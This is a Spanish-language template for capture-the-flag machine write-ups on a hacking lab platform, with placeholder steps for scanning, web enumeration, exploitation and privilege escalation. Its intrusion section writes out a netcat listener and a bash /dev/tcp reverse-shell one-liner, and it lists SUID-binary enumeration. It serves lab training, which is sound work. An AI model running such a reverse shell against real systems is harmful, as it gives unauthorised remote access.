# Writeup Template: Maquina `[Nombre_Máquina]`

- Tags: `[Etiqueta1]` `[Etiqueta2]` `[Etiqueta3]`
- Dificultad: `[Baja/Media/Alta/Insane]`
- Plataforma: `[ The Hackers Labs ]`

---
## Configuracion del Entorno
**Nota:** Pagina oficcioal donde descargo los laboratorios: [The Hackers Labs](https://labs.thehackerslabs.com/)
- Descargamos el archivo **( .ova )**
- Descomprimimos el archivo **zip**
- Importamos el **ova** en **virtualBox**

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
[IP_TARGET]
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 [IP_TARGET] 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py [IP_TARGET]
# TTL: [Valor] -> [Sistema_Operativo]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t [IP_TARGET] -p [Rango_Puertos]

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn [IP_TARGET] -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p[Puertos_Abiertos] [IP_TARGET] -oN targeted
```

**Servicios identificados:**
```bash
# Aqui los servicios
```
---

## Enumeracion de [Servicio  Principal]
direccion **URL** del servicio:
```bash
http://IP
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://[IP_TARGET]
```
### Descubrimiento de Archivos y Rutas
```bash
gobuster dir -u http://[IP_TARGET]/[Ruta] -w [Diccionario] -t [Hilos] -x [Extensiones]
```

- **Hallazgos**:
```bash
/admin (Status: 200) [Size: 1534]
/backup (Status: 301) [Size: 315]
```

### Descubrimiento de Subdominios
```bash
wfuzz -c -w [Diccionario] -H "Host:FUZZ.Aqui la URL" -u [IP_Objetivo]
```

- **Hallazgos**:
	Aqui los subdominios
### Credenciales Encontradas
- Usuario: `[Usuario]`
- Contraseña: `[Contraseña]`

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
[Descripción breve del método de explotación]

### Ejecucion del Ataque
```bash
# Comandos para explotación
[comando_explotacion]
```

### Intrusion
Modo escucha
```bash
nc -nlvp PORT
```

```bash
# Reverse shell o acceso inicial
bash -c 'exec bash -i &>/dev/tcp/IP_TARGE/PORT <&1'
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
id
sudo -l
find / -perm -4000 2>/dev/null
```

**Hallazgos Clave:**
- Binario con privilegios: `[Binario]`
- Credenciales de usuario: `[Usuario]:[Contraseña]`

### Explotacion de Privilegios

###### Usuario `[ Nombre-Usuario ]`:

```bash
# Comando para escalar al usuario: ( root )
[comando_escalada]
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
whoami
root
```
